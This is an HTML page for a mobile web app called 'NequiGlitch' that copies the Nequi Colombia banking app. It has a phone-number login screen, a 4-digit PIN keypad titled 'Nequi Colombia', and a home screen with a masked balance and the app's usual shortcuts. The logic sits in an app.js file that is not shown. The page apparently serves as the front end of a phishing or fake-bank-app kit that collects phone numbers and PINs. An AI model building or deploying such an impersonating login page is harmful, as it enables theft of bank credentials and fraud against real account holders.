<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />

  <!-- PWA -->
  <meta name="theme-color" content="#1f0020" />
  <link rel="manifest" href="/manifest.json" />

  <!-- iOS PWA -->
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
  <meta name="apple-mobile-web-app-title" content="NequiGlitch" />
  <link rel="apple-touch-icon" href="/icons/icon-192.png" />

  <!-- SEO -->
  <meta name="description" content="NequiGlitch" />
  <link rel="icon" href="/icons/icon-96.png" />

  <!-- Styles -->
  <link rel="stylesheet" href="/assets/css/tokens.css" />
  <link rel="stylesheet" href="/style.css" />

  <title>NequiGlitch</title>
</head>

<body>

  <!-- ═══════════════════════════════════════════
       PÁGINA 1: INICIAL (Login)
  ════════════════════════════════════════════ -->
  <section id="page-inicial" class="page active">
    <div class="page-bg" style="background-image: url('/assets/img/fondo.png');"></div>
    <div class="inicial-content">
      <!-- Phone input row -->
      <div class="phone-input-row">
        <span class="country-code">+57</span>
        <div class="separator-v"></div>
        <input id="phone-input" class="phone-field" type="tel" inputmode="numeric" maxlength="10"
          placeholder="Número de celular" autocomplete="tel-national" />
      </div>
      <!-- Enter button -->
      <button id="btn-entra" class="btn-entra" onclick="App.goToClave()">
        Entra
      </button>
    </div>
  </section>

  <!-- ═══════════════════════════════════════════
       PÁGINA 2: CLAVE (PIN 4 dígitos)
  ════════════════════════════════════════════ -->
  <section id="page-clave" class="page">
    <div class="page-bg" style="background-image: url('/assets/img/clavefondopage.png');"></div>
    <div class="clave-content">
      <!-- Title -->
      <h1 class="clave-title">Nequi Colombia</h1>

      <!-- 4-char PIN display -->
      <div class="pin-display" id="pin-display">
        <div class="pin-char" id="pin-c1"></div>
        <div class="pin-char" id="pin-c2"></div>
        <div class="pin-char" id="pin-c3"></div>
        <div class="pin-char" id="pin-c4"></div>
      </div>

      <!-- Numeric Keypad 3x4 -->
      <div class="keypad" id="keypad">
        <button class="key-btn" data-key="1">1</button>
        <button class="key-btn" data-key="2">2</button>
        <button class="key-btn" data-key="3">3</button>
        <button class="key-btn" data-key="4">4</button>
        <button class="key-btn" data-key="5">5</button>
        <button class="key-btn" data-key="6">6</button>
        <button class="key-btn" data-key="7">7</button>
        <button class="key-btn" data-key="8">8</button>
        <button class="key-btn" data-key="9">9</button>
        <div class="key-empty"></div>
        <button class="key-btn" data-key="0">0</button>
        <button class="key-btn key-delete" id="key-delete" aria-label="Borrar">
          <svg viewBox="0 0 24 24" fill="none">
            <path d="M21 4H7L1 12l6 8h14a2 2 0 002-2V6a2 2 0 00-2-2z" stroke="currentColor" stroke-width="1.8"
              stroke-linecap="round" stroke-linejoin="round" />
            <path d="M18 9l-6 6M12 9l6 6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"
              stroke-linejoin="round" />
          </svg>
        </button>
      </div>
    </div>
  </section>

  <!-- ═══════════════════════════════════════════
       PÁGINA 3: HOME NEQUI
  ════════════════════════════════════════════ -->
  <section id="page-home" class="page">
    <div class="home-wrapper">

      <!-- HEADER AREA -->
      <div class="home-header">
        <!-- Fondo orquídea + saldo -->
        <div class="home-header-bg"></div>

        <!-- Row superior: usuario + botones -->
        <div class="home-top-row">
          <div class="home-user">
            <div class="user-avatar">
              <svg viewBox="0 0 40 40" fill="none">
                <circle cx="20" cy="20" r="20" fill="rgba(255,255,255,0.15)" />
                <circle cx="20" cy="16" r="7" fill="rgba(255,255,255,0.7)" />
                <path d="M6 36c0-7.732 6.268-14 14-14s14 6.268 14 14" fill="rgba(255,255,255,0.7)" />
              </svg>
            </div>
            <div class="user-info">
              <span class="user-greeting">Hola,</span>
              <span class="user-name" id="home-username">USERPASSNEQUI</span>
            </div>
          </div>
          <div class="home-top-actions">
            <img src="/assets/img/tres_botones.png" alt="Opciones" class="tres-botones-img" />
          </div>
        </div>

        <!-- Saldo section -->
        <div class="saldo-section">
          <div class="saldo-label-row">
            <span class="saldo-label">Cuenta de Ahorros</span>
            <button class="eye-toggle" id="eye-toggle" onclick="App.toggleSaldo()" aria-label="Mostrar/ocultar saldo">
              <svg id="eye-icon" viewBox="0 0 24 24" fill="none">
                <path
                  d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"
                  stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" />
                <line x1="1" y1="1" x2="23" y2="23" stroke="white" stroke-width="1.5" stroke-linecap="round" />
              </svg>
            </button>
          </div>
          <div class="saldo-amount" id="saldo-amount">$ ****,00</div>
          <div class="saldo-total" id="saldo-total">Total $ ****,00</div>
          <img src="/assets/img/tu_plata.png" alt="Tu plata" class="tu-plata-img" />
        </div>
      </div>

      <!-- SCROLLABLE CONTENT -->
      <div class="home-scroll">

        <!-- Sugeridos Nequi -->
        <div class="section-title">Sugeridos Nequi</div>
        <div class="scroll-row" id="up-buttons">
          <div class="shortcut-item" onclick="App.noop()">
            <div class="shortcut-card"><img src="/assets/img/bre_b_icon.png" alt="Bre-B" /></div>
            <span>Bre-B</span>
          </div>
          <div class="shortcut-item" onclick="App.noop()">
            <div class="shortcut-card"><img src="/assets/img/mi_negocio_icon.png" alt="Mi Negocio" /></div>
            <span>Mi Negocio</span>
          </div>
          <div class="shortcut-item" onclick="App.noop()">
            <div class="shortcut-card"><img src="/assets/img/tigo_icon.png" alt="Tigo" /></div>
            <span>Tigo</span>
          </div>
          <div class="shortcut-item" onclick="App.noop()">
            <div class="shortcut-card"><img src="/assets/img/wom_icon.png" alt="Wom" /></div>
            <span>Metas</span>
          </div>
          <div class="shortcut-item" onclick="App.noop()">
            <div class="shortcut-card"><img src="/assets/img/tienda_virtual_icon.png" alt="Tienda" /></div>
            <span>Tienda virtual</span>
          </div>
          <div class="shortcut-item" onclick="App.noop()">
            <div class="shortcut-card"><img src="/assets/img/bolsillos_icon.png" alt="Bolsillos" /></div>
            <span>Bolsillos</span>
          </div>
          <div class="shortcut-item" onclick="App.noop()">
            <div class="shortcut-card"><img src="/assets/img/claro_icon.png" alt="Claro" /></div>
            <span>Claro</span>
          </div>
          <div class="shortcut-item" onclick="App.noop()">
            <div class="shortcut-card"><img src="/assets/img/mas_servicios_icon.png" alt="Más" /></div>
            <span>Más servicios</span>
          </div>
        </div>

        <!-- Tus Favoritos -->
        <div class="section-header">
          <img src="/assets/img/heart.png" alt="❤" class="section-icon" />
          <span class="section-title-inline">Tus favoritos</span>
          <img src="/assets/img/edit.png" alt="Editar" class="section-edit" onclick="App.noop()" />
        </div>
        <div class="scroll-row" id="down-buttons">
          <div class="shortcut-item" onclick="App.noop()">
            <div class="shortcut-card shortcut-card--shadow">
              <svg viewBox="0 0 49 47" fill="none" class="card-svg">
                <rect x="4" y="8" width="41" height="31" rx="4" fill="#DB0082" />
                <rect x="4" y="16" width="41" height="6" fill="#A80062" />
                <rect x="9" y="26" width="12" height="3" rx="1.5" fill="white" opacity="0.8" />
              </svg>
            </div>
            <span>Tarjeta</span>
          </div>
          <div class="shortcut-item" onclick="App.noop()">
            <div class="shortcut-card shortcut-card--shadow">
              <svg viewBox="0 0 49 47" fill="none" class="card-svg">
                <path d="M24.5 6L29 18H42L32 26L36 38L24.5 30L13 38L17 26L7 18H20L24.5 6Z" fill="#DB0082"
                  opacity="0.8" />
              </svg>
            </div>
            <span>Colchón</span>
          </div>
          <div class="shortcut-item" onclick="App.noop()">
            <div class="shortcut-card shortcut-card--shadow">
              <svg viewBox="0 0 49 47" fill="none" class="card-svg">
                <circle cx="24.5" cy="23.5" r="14" fill="#DB0082" opacity="0.15" />
                <path d="M18 28c0-3.6 2.9-6.5 6.5-6.5S31 24.4 31 28" stroke="#DB0082" stroke-width="2"
                  stroke-linecap="round" />
                <circle cx="24.5" cy="17" r="4" fill="#DB0082" />
              </svg>
            </div>
            <span>Bolsillos</span>
          </div>
          <div class="shortcut-item" onclick="App.noop()">
            <div class="shortcut-card shortcut-card--shadow">
              <svg viewBox="0 0 49 47" fill="none" class="card-svg">
                <path d="M24.5 8l3 9h9.5l-7.7 5.6 2.9 9-7.7-5.6-7.7 5.6 2.9-9L12 17h9.5l3-9z" fill="#DB0082" />
              </svg>
            </div>
            <span>Metas</span>
          </div>
          <div class="shortcut-item" onclick="App.noop()">
            <div class="shortcut-card shortcut-card--shadow">
              <svg viewBox="0 0 49 47" fill="none" class="card-svg">
                <circle cx="24.5" cy="23.5" r="11" stroke="#DB0082" stroke-width="2" />
                <line x1="24.5" y1="16" x2="24.5" y2="23.5" stroke="#DB0082" stroke-width="2" stroke-linecap="round" />
                <line x1="24.5" y1="23.5" x2="30" y2="23.5" stroke="#DB0082" stroke-width="2" stroke-linecap="round" />
              </svg>
            </div>
            <span>Agregar</span>
          </div>
        </div>

        <!-- Bottom spacer for nav -->
        <div style="height: 80px;"></div>
      </div><!-- end home-scroll -->

    </div><!-- end home-wrapper -->

    <!-- BOTTOM NAV -->
    <nav class="bottom-nav">
      <div class="nav-card">
        <!-- Inicio -->
        <button class="nav-item nav-item--active" onclick="App.setNavTab('home', this)">
          <svg viewBox="0 0 24 24" fill="none">
            <path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z" stroke="currentColor" stroke-width="1.8"
              stroke-linejoin="round" />
            <polyline points="9 22 9 12 15 12 15 22" stroke="currentColor" stroke-width="1.8" />
          </svg>
          <span>Inicio</span>
        </button>
        <!-- Movimientos -->
        <button class="nav-item" onclick="App.setNavTab('movimientos', this)">
          <svg viewBox="0 0 24 24" fill="none">
            <path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01" stroke="currentColor" stroke-width="1.8"
              stroke-linecap="round" stroke-linejoin="round" />
          </svg>
          <span>Movimientos</span>
        </button>
        <!-- Servicios -->
        <button class="nav-item" onclick="App.setNavTab('servicios', this)">
          <svg viewBox="0 0 24 24" fill="none">
            <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.8" />
            <path
              d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"
              stroke="currentColor" stroke-width="1.8" stroke-linecap="round" />
          </svg>
          <span>Servicios</span>
        </button>
      </div>
      <!-- Send button -->
      <button class="nav-send" onclick="App.noop()" aria-label="Enviar">
        <svg viewBox="0 0 24 24" fill="none">
          <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z" stroke="white" stroke-width="1.8" stroke-linecap="round"
            stroke-linejoin="round" />
        </svg>
      </button>
    </nav>
  </section>

  <!-- App scripts -->
  <script src="/app.js"></script>
</body>

</html>
